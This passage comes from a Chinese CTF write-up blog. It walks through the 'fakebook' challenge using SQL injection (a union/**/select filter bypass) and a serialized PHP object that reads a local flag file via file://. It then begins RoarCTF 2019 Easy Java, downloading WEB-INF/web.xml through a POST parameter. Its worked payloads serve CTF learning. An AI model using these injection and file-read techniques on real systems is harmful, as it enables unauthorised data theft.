Z2h0OjM5cHg7YmFja2dyb3VuZDojZmZmfSNib3R0b21fbGF5ZXIgLmxoe2Rpc3BsYXk6aW5saW5lO21hcmdpbi1yaWdodDoyMHB4fSNib3R0b21fbGF5ZXIgLmxoOmxhc3QtY2hpbGR7bWFyZ2luLWxlZnQ6LTJweDttYXJnaW4tcmlnaHQ6MH0jYm90dG9tX2xheWVyIC5saC5hY3Rpdml0eXtmb250LXdlaWdodDo3MDA7dGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZX0jYm90dG9tX2xheWVyIGF7Zm9udC1zaXplOjEycHg7dGV4dC1kZWNvcmF0aW9uOm5vbmV9I2JvdHRvbV9sYXllciAudGV4dC1jb2xvcntjb2xvcjojYmJifSNib3R0b21fbGF5ZXIgYTpob3Zlcntjb2xvcjojMjIyfSNib3R0b21fbGF5ZXIgLnMtYm90dG9tLWxheWVyLWNvbnRlbnR7dGV4dC1hbGlnbjpjZW50ZXJ9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGRpdiBpZD0id3JhcHBlciIgY2xhc3M9IndyYXBwZXJfbmV3Ij48ZGl2IGlkPSJoZWFkIj48ZGl2IGlkPSJzLXRvcC1sZWZ0IiBjbGFzcz0icy10b3AtbGVmdCBzLWlzaW5kZXgtd3JhcCI+PGEgaHJlZj0iLy9uZXdzLmJhaWR1LmNvbS8iIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0ibW5hdiBjLWZvbnQtbm9ybWFsIGMtY29sb3ItdCI+5paw6Ze7PC9hPjxhIGhyZWY9Ii8vd3d3LmhhbzEyMy5jb20vIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9Im1uYXYgYy1mb250LW5vcm1hbCBjLWNvbG9yLXQiPmhhbzEyMzwvYT48YSBocmVmPSIvL21hcC5iYWlkdS5jb20vIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9Im1uYXYgYy1mb250LW5vcm1hbCBjLWNvbG9yLXQiPuWcsOWbvjwvYT48YSBocmVmPSIvL2xpdmUuYmFpZHUuY29tLyIgdGFyZ2V0PSJfYmxhbmsiIGNsYXNzPSJtbmF2IGMtZm9udC1ub3JtYWwgYy1jb2xvci10Ij7nm7Tmkq08L2E+PGEgaHJlZj0iLy9oYW9rYW4uYmFpZHUuY29tLz9zZnJvbT1iYWlkdS10b3AiIHRhcmdldD0iX2JsYW5rIiBjbGFzcz0ibW5hdiBjLWZvbnQtbm9ybWFsIGMtY29sb3ItdCI+6KeG6aKRPC9hPjxhIGhyZWY9Ii8vdGllYmEuYmFpZHUuY29tLyIgdGFyZ2V0PSJfYmxhbmsiIGNsYXNzPSJtbmF2IGMtZm9udC1ub3JtYWwgYy1jb2xvci10Ij7otLTlkKc8L2E+PGEgaHJlZj0iLy94dWVzaHUuYmFpZHUuY29tLyIgdGFyZ2V0PSJfYmxhbmsiIGNsYXNzPSJtbmF2IGMtZm9udC1ub3JtYWwgYy1jb2xvci10Ij7lrabmnK88L2E+PGRpdiBjbGFzcz0ibW5hdiBzLXRvcC1tb3JlLWJ0biI+PGEgaHJlZj0iLy93d3cuYmFpZHUuY29tL21vcmUvIiBuYW1lPSJ0al9icmlpY29uIiBjbGFzcz0icy1icmkgYy1mb250LW5vcm1hbCBjLWNvbG9yLXQiIHRhcmdldD0iX2JsYW5rIj7mm7TlpJo8L2E+PC9kaXY+PC9kaXY+PGRpdiBpZD0idTEiIGNsYXNzPSJzLXRvcC1yaWdodCBzLWlzaW5kZXgtd3JhcCI+PGEgY2xhc3M9InMtdG9wLWxvZ2luLWJ0biBjLWJ0biBjLWJ0bi1wcmltYXJ5IGMtYnRuLW1pbmkgbGIiIHN0eWxlPSJwb3NpdGlvbjpyZWxhdGl2ZTtvdmVyZmxvdzp2aXNpYmxlIiBuYW1lPSJ0al9sb2dpbiIgaHJlZj0iLy93d3cuYmFpZHUuY29tL2Jkb3J6L2xvZ2luLmdpZj9sb2dpbiZhbXA7dHBsPW1uJmFtcDt1PWh0dHAlM0ElMkYlMkZ3d3cuYmFpZHUuY29tJTJmJTNmYmRvcnpfY29tZSUzZDEiPueZu+W9lTwvYT48L2Rpdj48ZGl2IGlkPSJoZWFkX3dyYXBwZXIiIGNsYXNzPSJoZWFkX3dyYXBwZXIgcy1pc2luZGV4LXdyYXAgcy1wcy1pc2xpdGUiPjxkaXYgY2xhc3M9InNfZm9ybSI+PGRpdiBjbGFzcz0ic19mb3JtX3dyYXBwZXIiPjxkaXYgaWQ9ImxnIiBjbGFzcz0icy1wLXRvcCI+PGltZyBoaWRlZm9jdXM9InRydWUiIGlkPSJzX2xnX2ltZyIgY2xhc3M9ImluZGV4LWxvZ28tc3JjIiBzcmM9Ii8vd3d3LmJhaWR1LmNvbS9pbWcvZmxleGlibGUvbG9nby9wYy9pbmRleC5wbmciIHdpZHRoPSIyNzAiIGhlaWdodD0iMTI5IiB1c2VtYXA9IiNtcCI+PG1hcCBuYW1lPSJtcCI+PGFyZWEgc3R5bGU9Im91dGxpbmU6MCIgaGlkZWZvY3VzPSJ0cnVlIiBzaGFwZT0icmVjdCIgY29vcmRzPSIwLDAsMjcwLDEyOSIgaHJlZj0iLy93d3cuYmFpZHUuY29tL3M/d2Q9JUU3JTk5JUJFJUU1JUJBJUE2JUU3JTgzJUFEJUU2JTkwJTlDJmFtcDtzYT1pcmVfZGxfZ2hfbG9nb190ZXhpbmcmYW1wO3Jzdl9kbD1pZ2hfbG9nb19wY3MiIHRhcmdldD0iX2JsYW5rIiB0aXRsZT0i54K55Ye75LiA5LiL77yM5LqG6Kej5pu05aSaIj48L21hcD48L2Rpdj48YSBocmVmPSIvL3d3dy5iYWlkdS5jb20vIiBpZD0icmVzdWx0X2xvZ28iPjwvYT48Zm9ybSBpZD0iZm9ybSIgbmFtZT0iZiIgYWN0aW9uPSIvL3d3dy5iYWlkdS5jb20vcyIgY2xhc3M9ImZtIj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJpZSIgdmFsdWU9InV0Zi04Ij4gPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZiIgdmFsdWU9IjgiPiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJyc3ZfYnAiIHZhbHVlPSIxIj4gPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icnN2X2lkeCIgdmFsdWU9IjEiPiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjaCIgdmFsdWU9IiI+IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRuIiB2YWx1ZT0iYmFpZHUiPiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJiYXIiIHZhbHVlPSIiPiA8c3BhbiBjbGFzcz0ic19pcHRfd3IgcXVpY2tkZWxldGUtd3JhcCI+PGlucHV0IGlkPSJrdyIgbmFtZT0id2QiIGNsYXNzPSJzX2lwdCIgdmFsdWU9IiIgbWF4bGVuZ3RoPSIyNTUiIGF1dG9jb21wbGV0ZT0ib2ZmIj4gPC9zcGFuPjxzcGFuIGNsYXNzPSJzX2J0bl93ciI+PGlucHV0IHR5cGU9InN1Ym1pdCIgaWQ9InN1IiB2YWx1ZT0i55m+5bqm5LiA5LiLIiBjbGFzcz0iYmcgc19idG4iPiA8L3NwYW4+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icm4iIHZhbHVlPSIiPiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmZW5sZWkiIHZhbHVlPSIyNTYiPiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJvcSIgdmFsdWU9IiI+IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InJzdl9wcSIgdmFsdWU9ImI5ZmYwOTNlMDAwMGU0MTkiPiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJyc3ZfdCIgdmFsdWU9IjM2MzVGWWJkYkM4dGxXbXVkWm1ZYVVuYXVjTmUrUnpUek5FR3FnL0p1bmlRVTEwV0w1bXRNUWVoSXJVIj4gPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icnFsYW5nIiB2YWx1ZT0iY24iPiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJyc3ZfZW50ZXIiIHZhbHVlPSIxIj4gPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icnN2X2RsIiB2YWx1ZT0iaWIiPjwvZm9ybT48L2Rpdj48L2Rpdj48L2Rpdj48ZGl2IGlkPSJib3R0b21fbGF5ZXIiIGNsYXNzPSJzLWJvdHRvbS1sYXllciBzLWlzaW5kZXgtd3JhcCI+PGRpdiBjbGFzcz0icy1ib3R0b20tbGF5ZXItY29udGVudCI+PHAgY2xhc3M9ImxoIj48YSBjbGFzcz0idGV4dC1jb2xvciIgaHJlZj0iLy9ob21lLmJhaWR1LmNvbS8iIHRhcmdldD0iX2JsYW5rIj7lhbPkuo7nmb7luqY8L2E+PC9wPjxwIGNsYXNzPSJsaCI+PGEgY2xhc3M9InRleHQtY29sb3IiIGhyZWY9Ii8vaXIuYmFpZHUuY29tLyIgdGFyZ2V0PSJfYmxhbmsiPkFib3V0IEJhaWR1PC9hPjwvcD48cCBjbGFzcz0ibGgiPjxhIGNsYXNzPSJ0ZXh0LWNvbG9yIiBocmVmPSIvL3d3dy5iYWlkdS5jb20vZHV0eSIgdGFyZ2V0PSJfYmxhbmsiPuS9v+eUqOeZvuW6puWJjeW/heivuzwvYT48L3A+PHAgY2xhc3M9ImxoIj48YSBjbGFzcz0idGV4dC1jb2xvciIgaHJlZj0iLy9oZWxwLmJhaWR1LmNvbS8iIHRhcmdldD0iX2JsYW5rIj7luK7liqnkuK3lv4M8L2E+PC9wPjxwIGNsYXNzPSJsaCI+PGEgY2xhc3M9InRleHQtY29sb3IiIGhyZWY9Ii8vd3d3LmJlaWFuLmdvdi5jbi9wb3J0YWwvcmVnaXN0ZXJTeXN0ZW1JbmZvP3JlY29yZGNvZGU9MTEwMDAwMDIwMDAwMDEiIHRhcmdldD0iX2JsYW5rIj7kuqzlhaznvZHlronlpIcxMTAwMDAwMjAwMDAwMeWPtzwvYT48L3A+PHAgY2xhc3M9ImxoIj48YSBjbGFzcz0idGV4dC1jb2xvciIgaHJlZj0iLy9iZWlhbi5taWl0Lmdvdi5jbi8iIHRhcmdldD0iX2JsYW5rIj7kuqxJQ1Dor4EwMzAxNzPlj7c8L2E+PC9wPjxwIGNsYXNzPSJsaCI+PHNwYW4gaWQ9InllYXIiIGNsYXNzPSJ0ZXh0LWNvbG9yIj48L3NwYW4+PC9wPjxwIGNsYXNzPSJsaCI+PHNwYW4gY2xhc3M9InRleHQtY29sb3IiPuS6kuiBlOe9keiNr+WTgeS/oeaBr+acjeWKoei1hOagvOivgeS5piAo5LqsKS3nu4/okKXmgKctMjAxNy0wMDIwPC9zcGFuPjwvcD48cCBjbGFzcz0ibGgiPjxhIGNsYXNzPSJ0ZXh0LWNvbG9yIiBocmVmPSIvL3d3dy5iYWlkdS5jb20vbGljZW5jZS8iIHRhcmdldD0iX2JsYW5rIj7kv6Hmga/nvZHnu5zkvKDmkq3op4blkKzoioLnm67orrjlj6/or4EgMDExMDUxNjwvYT48L3A+PC9kaXY+PC9kaXY+PC9kaXY+PC9kaXY+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPnZhciBkYXRlPW5ldyBEYXRlLHllYXI9ZGF0ZS5nZXRGdWxsWWVhcigpO2RvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ5ZWFyIikuaW5uZXJUZXh0PSLCqSIreWVhcisiIEJhaWR1ICI8L3NjcmlwdD48L2JvZHk+PC9odG1sPg==&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个标签的功能很特殊，会嵌套显示出你的博客的内容，类似于画中画的效果。</p>
<p>根据上面三个问题分析：</p>
<p>这里通过报错是能知道当前文件在哪个路径下的。这里使用file:///读取服务器本地文件数据。</p>
<h4 id="插入数据–失败"><a href="#插入数据–失败" class="headerlink" title="插入数据–失败"></a>插入数据–失败</h4><p>这里其实前面就知道了。正则表达式的过滤很严谨，几乎可以说完全是为了http协议准备的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment"># 对博客内容近乎全部符号的过滤</span></span><br><span class="line">   <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">   <span class="comment">#过滤传入的博客地址是否为http的格式</span></span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="更新数据–失败"><a href="#更新数据–失败" class="headerlink" title="更新数据–失败"></a>更新数据–失败</h4><p>脚本测试的前提是hackbar能完整的模拟测试，但是这次翻车了。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">no</span><span class="operator">=</span>(if((<span class="keyword">UPDATE</span> fakebook.users <span class="keyword">SET</span> data<span class="operator">=</span><span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><span class="keyword">WHERE</span> <span class="keyword">no</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span>),<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 然后报错：</span></span><br><span class="line">[<span class="operator">*</span>]查询错误！ （您的 <span class="keyword">SQL</span> 语法有错误；请检查与您的 MariaDB 服务器版本对应的手册，了解在 <span class="string">&#x27;UPDATE fakebook.users SET data=&#x27;</span>O:<span class="number">8</span>:&quot;UserInfo&quot;:<span class="number">3</span>:&#123;s:<span class="number">4</span> 附近使用的正确语法:&quot;name&quot;;s:<span class="number">5</span>:&quot;admin&quot;;s:<span class="number">3</span>:&quot;ag&#x27; 在第 1 行) </span><br><span class="line">-- 这里即便是换成char()和concat()的组合形式都不行。</span><br></pre></td></tr></table></figure>

<h4 id="测回显点测试"><a href="#测回显点测试" class="headerlink" title="测回显点测试"></a>测回显点测试</h4><p>这里还是一步步来。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--  1.测当前表列数</span></span><br><span class="line">?<span class="keyword">no</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span></span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span> admin</span><br><span class="line"></span><br><span class="line">?<span class="keyword">no</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span></span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span> 报错</span><br><span class="line"><span class="comment">-- 很显然，4列是当前表的极限（回显点）</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 回显的点有了，尝试联合查询</span></span><br><span class="line">?<span class="keyword">no</span><span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span>  <span class="keyword">no</span> hack <span class="operator">~</span>_<span class="operator">~</span></span><br><span class="line"><span class="comment">-- 绕过封禁</span></span><br><span class="line">?<span class="keyword">no</span><span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span> 能回显的只有一点：username列回显了个<span class="number">2</span>，说明<span class="number">2</span>是回显点。</span><br><span class="line"><span class="comment">-- 通过2这个回显点我们能做正常的SQL注入</span></span><br><span class="line"><span class="comment">-- 虽然脚本注入挺锻炼的，但是还是有些费劲。</span></span><br></pre></td></tr></table></figure>

<p>问题来了，哪个反序列化要放哪里？</p>
<p>其实很好理解，那个username不是占用了2的位置么，那按顺序写下去，那个链接的位置不就是4么。（刚刚好就是之前测试出来的那个列名组合）</p>
<p>数据库存储的时候是以序列化后的代码存储在data列，而data列系解析到前端就是url和下面的博客文件加载内容。</p>
<p>写个data替换掉4的位置应该就差不多了。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 尝试插入反序列化代码</span></span><br><span class="line">?<span class="keyword">no</span><span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span> 前端页面回显的正是<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span>当中的内容。</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 其中，包含了一个至关重要的URL：</span></span><br><span class="line"><span class="operator">&lt;</span>iframe width<span class="operator">=</span><span class="string">&#x27;100%&#x27;</span> height<span class="operator">=</span><span class="string">&#x27;10em&#x27;</span> src<span class="operator">=</span><span class="string">&#x27;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3sxZTkzODcwMC01ODE4LTRjNjctYjJmOC1mNTc5OTQxZDg1OTR9IjsNCmV4aXQoMCk7DQo=&#x27;</span><span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>

<p>获取其中的base64并解码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;PD9waHANCg0KJGZsYWcgPSAiZmxhZ3sxZTkzODcwMC01ODE4LTRjNjctYjJmOC1mNTc5OTQxZDg1OTR9IjsNCmV4aXQoMCk7DQo=&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密结果</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;1e938700-5818-4c67-b2f8-f579941d8594&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>写了我快一天的解析脚本，还算好玩吧。</p>
<p>其实即使是最后测试出了flag，我还是想通过脚本的方式测试出flag。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">这次唯一学到的是使用<span class="comment">/**/</span>绕过对 <span class="keyword">union</span> <span class="keyword">select</span> 的封禁。</span><br></pre></td></tr></table></figure>

<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><h2 id="原始信息-1"><a href="#原始信息-1" class="headerlink" title="原始信息"></a>原始信息</h2><p>一眼就看出这个是框架了。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">访问：/Login</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;Login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;Download?filename=help.docx&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>help<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">访问：/Download?filename=help.docx</span><br><span class="line"></span><br><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">访问：/Download</span><br><span class="line">get:</span><br><span class="line">   /Download?filename=help.docx</span><br><span class="line"></span><br><span class="line">return：</span><br><span class="line">   java.io.FileNotFoundException：&#123;help.docx&#125; </span><br></pre></td></tr></table></figure>

<h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>无法弱密码爆破，寻找其它突破口</p>
<p>java模板漏洞第一次接触，难度很大。这里参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wy_97/article/details/78165051">源码泄露博客资料</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">这里需要灵活点，给Download变式</span><br><span class="line"></span><br><span class="line">get:   </span><br><span class="line">   /Download</span><br><span class="line">post:</span><br><span class="line">   filename=help.docx</span><br><span class="line"><span class="comment">// 这时就能下载文件了，下载help.docx</span></span><br><span class="line"></span><br><span class="line">get:</span><br><span class="line">   /Download</span><br><span class="line">post:</span><br><span class="line">   filename=/WEB-INF/web.xml</span><br><span class="line"><span class="comment">// 下载xml文件，看见了文件架构：</span></span><br></pre></td></tr></table></figure>

<p>xml文件内容：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Index<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Flag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>既然得到了xml文件，那就得顺着java分析。</p>
<p>观察看来，这应该是映射前端架构和后端结构对应关系的一个文件。</p>
<p>带斜杠的都是前端访问的对应网页文件，那么点分的应该是后端对应的架构文件。</p>
<p>而java后端能映射为可执行文件的想来也就一种：class后缀文件。</p>
<p>如果斜杠是前端的标志，那点就是后端的标志，都能划分目录等级。</p>
